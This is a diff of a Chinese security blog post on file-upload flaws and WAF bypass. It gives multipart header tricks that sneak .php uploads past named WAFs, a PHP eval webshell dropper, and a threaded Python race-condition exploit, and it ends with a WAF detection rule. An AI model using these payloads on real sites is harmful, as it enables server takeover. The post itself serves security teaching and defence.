@@ -60,18 +60,18 @@
   };
 </script>
 
-  <meta name="description" content="1. 前言本文主要讨论下 文件上传和WAF的功与防。 测试环境均为  nginx/1.10.3 PHP 5.5.34  有些特性和 语言及webserver有关，有问题的地方，欢迎大家指正。 2. 文件上传的特征先来了解下文件上传的特征，抓包看看这段文件上传代码的HTTP请求。 upload.php 1234567891011121314151617181920&amp;lt;?phpif(isset($">
-<meta name="keywords" content="Web安全，移动安全，windows安全，漏洞挖掘，代码审计，智能合约">
+  <meta name="description" content="前言本文主要讨论下 文件上传和WAF的功与防。 测试环境均为  nginx/1.10.3 PHP 5.5.34  有些特性和 语言及webserver有关，有问题的地方，欢迎大家指正。 文件上传的特征先来了解下文件上传的特征，抓包看看这段文件上传代码的HTTP请求。 upload.php 1234567891011121314151617181920&amp;lt;?phpif(isset($_POST[">
+<meta name="keywords" content="文件上传,bypass">
 <meta property="og:type" content="article">
 <meta property="og:title" content="上传漏洞">
 <meta property="og:url" content="https://wh0ale.github.io/2019/01/13/2019-1-13-上传漏洞/index.html">
 <meta property="og:site_name" content="Wh0ale&#39;s Blog">
-<meta property="og:description" content="1. 前言本文主要讨论下 文件上传和WAF的功与防。 测试环境均为  nginx/1.10.3 PHP 5.5.34  有些特性和 语言及webserver有关，有问题的地方，欢迎大家指正。 2. 文件上传的特征先来了解下文件上传的特征，抓包看看这段文件上传代码的HTTP请求。 upload.php 1234567891011121314151617181920&amp;lt;?phpif(isset($">
+<meta property="og:description" content="前言本文主要讨论下 文件上传和WAF的功与防。 测试环境均为  nginx/1.10.3 PHP 5.5.34  有些特性和 语言及webserver有关，有问题的地方，欢迎大家指正。 文件上传的特征先来了解下文件上传的特征，抓包看看这段文件上传代码的HTTP请求。 upload.php 1234567891011121314151617181920&amp;lt;?phpif(isset($_POST[">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-09-06T06:03:19.234Z">
+<meta property="og:updated_time" content="2019-12-06T11:46:42.431Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="上传漏洞">
-<meta name="twitter:description" content="1. 前言本文主要讨论下 文件上传和WAF的功与防。 测试环境均为  nginx/1.10.3 PHP 5.5.34  有些特性和 语言及webserver有关，有问题的地方，欢迎大家指正。 2. 文件上传的特征先来了解下文件上传的特征，抓包看看这段文件上传代码的HTTP请求。 upload.php 1234567891011121314151617181920&amp;lt;?phpif(isset($">
+<meta name="twitter:description" content="前言本文主要讨论下 文件上传和WAF的功与防。 测试环境均为  nginx/1.10.3 PHP 5.5.34  有些特性和 语言及webserver有关，有问题的地方，欢迎大家指正。 文件上传的特征先来了解下文件上传的特征，抓包看看这段文件上传代码的HTTP请求。 upload.php 1234567891011121314151617181920&amp;lt;?phpif(isset($_POST[">
   <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
   <link rel="canonical" href="https://wh0ale.github.io/2019/01/13/2019-1-13-上传漏洞/">
 
@@ -317,9 +317,24 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-09-06 14:03:19" itemprop="dateModified" datetime="2019-09-06T14:03:19+08:00">2019-09-06</time>
+                <time title="修改时间：2019-12-06 19:46:42" itemprop="dateModified" datetime="2019-12-06T19:46:42+08:00">2019-12-06</time>
               </span>
             
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/文件上传/" itemprop="url" rel="index"><span itemprop="name">文件上传</span></a></span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -339,7 +354,7 @@
               
                 <span class="post-meta-item-text">本文字数：</span>
               
-              <span title="本文字数">8.5k</span>
+              <span title="本文字数">8.4k</span>
             </span>
           
             <span class="post-meta-item">
@@ -364,14 +379,14 @@
 
 
       
-        <h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h1><p>本文主要讨论下 文件上传和WAF的功与防。</p>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文主要讨论下 文件上传和WAF的功与防。</p>
 <p>测试环境均为</p>
 <ul>
 <li>nginx/1.10.3</li>
 <li>PHP 5.5.34</li>
 </ul>
 <p>有些特性和 语言及webserver有关，有问题的地方，欢迎大家指正。</p>
-<h1 id="2-文件上传的特征"><a href="#2-文件上传的特征" class="headerlink" title="2. 文件上传的特征"></a>2. 文件上传的特征</h1><p>先来了解下文件上传的特征，抓包看看这段文件上传代码的HTTP请求。</p>
+<h1 id="文件上传的特征"><a href="#文件上传的特征" class="headerlink" title="文件上传的特征"></a>文件上传的特征</h1><p>先来了解下文件上传的特征，抓包看看这段文件上传代码的HTTP请求。</p>
 <p>upload.php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit_x'</span>]))&#123;</span><br><span class="line">    $upfile = $_FILES[<span class="string">'filename'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $tempfile = $_FILES[<span class="string">'filename'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">$ext = trim(get_extension($upfile));</span><br><span class="line"><span class="comment">// 判断文件后缀是否为数组里的值</span></span><br><span class="line">    <span class="keyword">if</span>(in_array($ext,<span class="keyword">array</span>(<span class="string">'xxx'</span>)))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Warning! File type error..'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">$savefile = <span class="string">'upload/'</span> . $upfile;</span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($tempfile, $savefile))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Upload success! FileName: '</span>.$savefile);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Upload failed..'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取文件后缀名，并转为小写</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_extension</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> strtolower(substr($file, strrpos($file, <span class="string">'.'</span>)+<span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -392,7 +407,7 @@
 <li>POST中的boundary的值就是Content-Type的值在最前面加了两个--，除了最后标识结束的boundary</li>
 <li>最后标识结束的boundary最后默认会多出两个--（测试时，最后一行的boundary删掉也能成功上传）</li>
 </ul>
-<h1 id="3-WAF如何拦截"><a href="#3-WAF如何拦截" class="headerlink" title="3. WAF如何拦截"></a>3. WAF如何拦截</h1><p>先来想想，如果自己写WAF来防御恶意文件上传。你应该如何防御？</p>
+<h1 id="WAF如何拦截"><a href="#WAF如何拦截" class="headerlink" title="WAF如何拦截"></a>WAF如何拦截</h1><p>先来想想，如果自己写WAF来防御恶意文件上传。你应该如何防御？</p>
 <ul>
 <li>文件名</li>
 <li>解析文件名，判断是否在黑名单内。</li>
@@ -412,53 +427,53 @@
 <p><a href="https://github.com/openresty/lua-resty-upload" target="_blank" rel="noopener">lua-resty-upload</a>这份代码还在维护，不过只是取了内容，文件名需要自己解析。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br><span class="line"> Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;xx.php&quot;</span><br><span class="line"> Content-Type: text/javascript</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line"> ------WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br><span class="line"> Content-Disposition: form-data; name=&quot;submit_x&quot;</span><br><span class="line"></span><br><span class="line">upload</span><br><span class="line"> ------WebKitFormBoundaryj1oRYFW91eaj8Ex2--</span><br></pre></td></tr></table></figure>
 
-<h1 id="4-绕过"><a href="#4-绕过" class="headerlink" title="4. 绕过"></a>4. 绕过</h1><p>获取文件名的地方在Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;xx.php&quot;和Content-Type里，所以绕过的地方也就在这两个地方了。</p>
-<h2 id="4-1-去掉引号"><a href="#4-1-去掉引号" class="headerlink" title="4.1 去掉引号"></a>4.1 去掉引号</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=file_x; filename=&quot;xx.php&quot;</span><br><span class="line">Content-Disposition: form-data; name=file_x; filename=xx.php</span><br><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; filename=xx.php</span><br></pre></td></tr></table></figure>
+<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><p>获取文件名的地方在Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;xx.php&quot;和Content-Type里，所以绕过的地方也就在这两个地方了。</p>
+<h2 id="去掉引号"><a href="#去掉引号" class="headerlink" title="去掉引号"></a>去掉引号</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=file_x; filename=&quot;xx.php&quot;</span><br><span class="line">Content-Disposition: form-data; name=file_x; filename=xx.php</span><br><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; filename=xx.php</span><br></pre></td></tr></table></figure>
 
-<h2 id="4-2-双引号变成单引号"><a href="#4-2-双引号变成单引号" class="headerlink" title="4.2 双引号变成单引号"></a>4.2 双引号变成单引号</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&apos;file_x&apos;; filename=&apos;xx.php&apos;</span><br></pre></td></tr></table></figure>
+<h2 id="双引号变成单引号"><a href="#双引号变成单引号" class="headerlink" title="双引号变成单引号"></a>双引号变成单引号</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&apos;file_x&apos;; filename=&apos;xx.php&apos;</span><br></pre></td></tr></table></figure>
 
 <p>单引号、双引号、不要引号，都能上传。</p>
-<h2 id="4-3-大小写"><a href="#4-3-大小写" class="headerlink" title="4.3 大小写"></a>4.3 大小写</h2><p>对这三个固定的字符串进行大小写转换</p>
+<h2 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h2><p>对这三个固定的字符串进行大小写转换</p>
 <ul>
 <li>Content-Disposition</li>
 <li>name</li>
 <li>filename</li>
 </ul>
 <p>比如name转换成Name，Content-Disposition转换成content-disposition。两年前，拿它绕过安全狗的上传，不知道现在如何。</p>
-<h2 id="4-4-空格"><a href="#4-4-空格" class="headerlink" title="4.4 空格"></a>4.4 空格</h2><p>Content-Disposition: form-data; name=file_x; filename=xx.php</p>
+<h2 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h2><p>Content-Disposition: form-data; name=file_x; filename=xx.php</p>
 <p>在: ; =添加1个或者多个空格，不过测试只有filename在=前面添加空格，上传失败。</p>
 <p>在filename=后面添加空格，截止到2017年10月04日还能绕过某盾WAF。</p>
-<h2 id="4-5-去掉或修改Content-Disposition值"><a href="#4-5-去掉或修改Content-Disposition值" class="headerlink" title="4.5 去掉或修改Content-Disposition值"></a>4.5 去掉或修改Content-Disposition值</h2><p>有的WAF在解析的时候，认为Content-Disposition值一定是form-data，造成绕过。两年前，拿它绕过安全狗的上传，不知道现在如何。</p>
+<h2 id="去掉或修改Content-Disposition值"><a href="#去掉或修改Content-Disposition值" class="headerlink" title="去掉或修改Content-Disposition值"></a>去掉或修改Content-Disposition值</h2><p>有的WAF在解析的时候，认为Content-Disposition值一定是form-data，造成绕过。两年前，拿它绕过安全狗的上传，不知道现在如何。</p>
 <p>Content-Disposition: name=&#39;file_x&#39;; filename=&#39;xx.php&#39;</p>
-<h2 id="4-6-交换name和filename的顺序"><a href="#4-6-交换name和filename的顺序" class="headerlink" title="4.6 交换name和filename的顺序"></a>4.6 交换name和filename的顺序</h2><p>规定Content-Disposition必须在最前面，所以只能交换name和filename的顺序。</p>
+<h2 id="交换name和filename的顺序"><a href="#交换name和filename的顺序" class="headerlink" title="交换name和filename的顺序"></a>交换name和filename的顺序</h2><p>规定Content-Disposition必须在最前面，所以只能交换name和filename的顺序。</p>
 <p>有的WAF可能会匹配name在前面，filename在后面，所以下面姿势会导致Bypass。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; filename=&quot;xx.php&quot;; name=file_x</span><br></pre></td></tr></table></figure>
 
-<h2 id="4-7-多个boundary"><a href="#4-7-多个boundary" class="headerlink" title="4.7 多个boundary"></a>4.7 多个boundary</h2><p>最后上传的文件是test.php而非test.txt，但是取的文件名只取了第一个就会被Bypass。</p>
+<h2 id="多个boundary"><a href="#多个boundary" class="headerlink" title="多个boundary"></a>多个boundary</h2><p>最后上传的文件是test.php而非test.txt，但是取的文件名只取了第一个就会被Bypass。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br><span class="line"> Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;test.txt&quot;</span><br><span class="line"> Content-Type: text/javascript</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line"> ------WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br><span class="line"> Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;test.php&quot;</span><br><span class="line"> Content-Type: text/javascript</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line"> ------WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br><span class="line"> Content-Disposition: form-data; name=&quot;submit_x&quot;</span><br><span class="line"></span><br><span class="line">upload</span><br><span class="line"> ------WebKitFormBoundaryj1oRYFW91eaj8Ex2--</span><br></pre></td></tr></table></figure>
 
-<h2 id="4-8-多个filename"><a href="#4-8-多个filename" class="headerlink" title="4.8 多个filename"></a>4.8 多个filename</h2><p>最终上传成功的文件名是test.php。但是由于解析文件名时，会解析到第一个。正则默认都会匹配到第一个。</p>
+<h2 id="多个filename"><a href="#多个filename" class="headerlink" title="多个filename"></a>多个filename</h2><p>最终上传成功的文件名是test.php。但是由于解析文件名时，会解析到第一个。正则默认都会匹配到第一个。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;test.txt&quot;; filename=&quot;test.php&quot;</span><br></pre></td></tr></table></figure>
 
-<h2 id="4-9-多个分号"><a href="#4-9-多个分号" class="headerlink" title="4.9 多个分号"></a>4.9 多个分号</h2><p>文件解析时，可能解析不到文件名，导致绕过。</p>
+<h2 id="多个分号"><a href="#多个分号" class="headerlink" title="多个分号"></a>多个分号</h2><p>文件解析时，可能解析不到文件名，导致绕过。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;;;; filename=&quot;test.php&quot;</span><br></pre></td></tr></table></figure>
 
-<h2 id="4-10-multipart-form-DATA"><a href="#4-10-multipart-form-DATA" class="headerlink" title="4.10 multipart/form-DATA"></a>4.10 multipart/form-DATA</h2><p>这种绕过应该很少，大多数都会忽略大小写。php和java都支持。</p>
+<h2 id="multipart-form-DATA"><a href="#multipart-form-DATA" class="headerlink" title="multipart/form-DATA"></a>multipart/form-DATA</h2><p>这种绕过应该很少，大多数都会忽略大小写。php和java都支持。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-DATA</span><br></pre></td></tr></table></figure>
 
-<h2 id="4-11-Header在boundary前添加任意字符"><a href="#4-11-Header在boundary前添加任意字符" class="headerlink" title="4.11 Header在boundary前添加任意字符"></a>4.11 Header在boundary前添加任意字符</h2><p>这个只能说，PHP很皮，这都支持。试了JAVA会报错。</p>
+<h2 id="Header在boundary前添加任意字符"><a href="#Header在boundary前添加任意字符" class="headerlink" title="Header在boundary前添加任意字符"></a>Header在boundary前添加任意字符</h2><p>这个只能说，PHP很皮，这都支持。试了JAVA会报错。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-data; bypassboundary=----WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br></pre></td></tr></table></figure>
 
-<h2 id="4-12-filename换行"><a href="#4-12-filename换行" class="headerlink" title="4.12 filename换行"></a>4.12 filename换行</h2><p>PHP支持，Java不支持。截止到2017年10月18日，这个方法能绕过某盾。</p>
+<h2 id="filename换行"><a href="#filename换行" class="headerlink" title="filename换行"></a>filename换行</h2><p>PHP支持，Java不支持。截止到2017年10月18日，这个方法能绕过某盾。</p>
 <p>Content-Disposition: form-data; name=&quot;file_x&quot;; file<br> name=&quot;test.php&quot;</p>
 <p>这种PHP也支持。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fi</span><br><span class="line"> lename</span><br></pre></td></tr></table></figure>
 
-<h2 id="4-13-name和filename添加任意字符串"><a href="#4-13-name和filename添加任意字符串" class="headerlink" title="4.13 name和filename添加任意字符串"></a>4.13 name和filename添加任意字符串</h2><p>PHP上传成功，Java上传失败。</p>
+<h2 id="name和filename添加任意字符串"><a href="#name和filename添加任意字符串" class="headerlink" title="name和filename添加任意字符串"></a>name和filename添加任意字符串</h2><p>PHP上传成功，Java上传失败。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: name=&quot;file_x&quot;; bypass waf upload; filename=&quot;test.php&quot;;</span><br></pre></td></tr></table></figure>
 
-<h2 id="4-14-其他"><a href="#4-14-其他" class="headerlink" title="4.14 其他"></a>4.14 其他</h2><p>其他利用系统特性的就不描述了，不是本文重点。有兴趣可以看下<a href="https://www.jiwo.org/ken/detail.php?id=716" target="_blank" rel="noopener">我的Waf Bypass之道（upload篇）</a></p>
-<h1 id="5-案例绕过"><a href="#5-案例绕过" class="headerlink" title="5. 案例绕过"></a>5. 案例绕过</h1><h3 id="5-1-某盾"><a href="#5-1-某盾" class="headerlink" title="5.1 某盾"></a>5.1 某盾</h3><p>测试某盾WAF对恶意文件上传的拦截。方法比较粗暴，判断如下：</p>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>其他利用系统特性的就不描述了，不是本文重点。有兴趣可以看下<a href="https://www.jiwo.org/ken/detail.php?id=716" target="_blank" rel="noopener">我的Waf Bypass之道（upload篇）</a></p>
+<h1 id="案例绕过"><a href="#案例绕过" class="headerlink" title="案例绕过"></a>案例绕过</h1><h3 id="某盾"><a href="#某盾" class="headerlink" title="某盾"></a>某盾</h3><p>测试某盾WAF对恶意文件上传的拦截。方法比较粗暴，判断如下：</p>
 <ol>
 <li>判断POST数据是否存在Content-Disposition:字符串</li>
 <li>判断filename的文件名是否在黑名单内</li>
@@ -471,7 +486,7 @@
 <p>下面这种也能绕过。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; file</span><br><span class="line"> name=&quot;test.php&quot;</span><br></pre></td></tr></table></figure>
 
-<h3 id="5-2-UCloud"><a href="#5-2-UCloud" class="headerlink" title="5.2 UCloud"></a>5.2 UCloud</h3><p>先找一个用了UCloud WAF的网站测试。</p>
+<h3 id="UCloud"><a href="#UCloud" class="headerlink" title="UCloud"></a>UCloud</h3><p>先找一个用了UCloud WAF的网站测试。</p>
 <p>拦截</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;;filename=&quot;xx.php&quot;</span><br></pre></td></tr></table></figure>
 
@@ -479,24 +494,24 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition:  name=&quot;file_x&quot;;filename=&quot;xx.php&quot;</span><br></pre></td></tr></table></figure>
 
 <p>其他的就不测试了…</p>
-<h3 id="5-3-竞争上传"><a href="#5-3-竞争上传" class="headerlink" title="5.3 竞争上传"></a>5.3 竞争上传</h3><p>演示代码：</p>
+<h3 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h3><p>演示代码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$allowtype = <span class="keyword">array</span>(<span class="string">"gif"</span>,<span class="string">"png"</span>,<span class="string">"jpg"</span>);</span><br><span class="line">$size = <span class="number">10000000</span>;</span><br><span class="line">$path = <span class="string">"./"</span>;</span><br><span class="line"></span><br><span class="line">$filename = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$path.$filename))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"error:can not move"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"error:not an upload file！"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$newfile = $path.$filename;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"file upload success.file path is: "</span>.$newfile.<span class="string">"\n&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'error'</span>]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    unlink($newfile);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Upload file error: "</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ext = array_pop(explode(<span class="string">"."</span>,$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]));</span><br><span class="line"><span class="keyword">if</span>(!in_array($ext,$allowtype))&#123;</span><br><span class="line">    unlink($newfile);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"error:upload the file type is not allowed，delete the file！"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，我们的利用思路是这样的，首先上传一个php文件，内容为：</p>
 <p>copy.php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">"./info.php"</span>, <span class="string">"w"</span>), <span class="string">'&lt;?php @eval($_POST["drops"]) ?&gt;'</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。利用代码如下：</p>
+<p>当然这个文件会被立马删掉，所以我们<strong>使用多线程并发的访问上传的文件</strong>，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。利用代码如下：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">class RaceCondition(threading.Thread):</span><br><span class="line">    def __init__(<span class="keyword">self</span>):</span><br><span class="line">        threading.Thread.__init__(<span class="keyword">self</span>)</span><br><span class="line">        <span class="keyword">self</span>.url = <span class="string">"http://127.0.0.1:8080/upload/shell0.php"</span></span><br><span class="line">        <span class="keyword">self</span>.uploadUrl = <span class="string">"http://127.0.0.1:8080/upload/copy.php"</span></span><br><span class="line"></span><br><span class="line">    def _get(<span class="keyword">self</span>):</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">'try to call uploaded file...'</span>)</span><br><span class="line">        r = requests.get(<span class="keyword">self</span>.url)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">"[*]create file info.php success"</span>)</span><br><span class="line">            os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    def _upload(<span class="keyword">self</span>):</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">"upload file....."</span>)</span><br><span class="line">        file = &#123;<span class="string">"file"</span>:open(<span class="string">"shell0.php"</span>,<span class="string">"r"</span>)&#125;</span><br><span class="line">        requests.post(<span class="keyword">self</span>.uploadUrl, files=file)</span><br><span class="line"></span><br><span class="line">    def run(<span class="keyword">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            <span class="keyword">for</span> i in range(<span class="number">5</span>):</span><br><span class="line">                <span class="keyword">self</span>._get()</span><br><span class="line">            <span class="keyword">for</span> i in range(<span class="number">10</span>):</span><br><span class="line">                <span class="keyword">self</span>._upload()</span><br><span class="line">                <span class="keyword">self</span>._get()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    threads = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i in range(threads):</span><br><span class="line">        t = RaceCondition()</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i in range(threads):</span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure>
 
 <p>经过几次尝试后成功成功写入shell</p>
-<h1 id="6-How-to-Play"><a href="#6-How-to-Play" class="headerlink" title="6.How to Play"></a>6.How to Play</h1><p>看了这么多，那规则到底应该如何写。我个人想法如下：</p>
+<h1 id="How-to-Play"><a href="#How-to-Play" class="headerlink" title="How to Play"></a>How to Play</h1><p>看了这么多，那规则到底应该如何写。我个人想法如下：</p>
 <ol>
 <li>由于是文件上传，所以必须有Content-Type: multipart/form-data，先判断这个是否存在。</li>
-<li>POST数据去掉所有换行，匹配是否有Content-Disposition:.<em>filename\s</em>=\s<em>(.</em>php)类似的规则。</li>
+<li>POST数据去掉所有换行，匹配是否有<code>Content-Disposition:.*filename\s*=\s*(.*php)</code>类似的规则。</li>
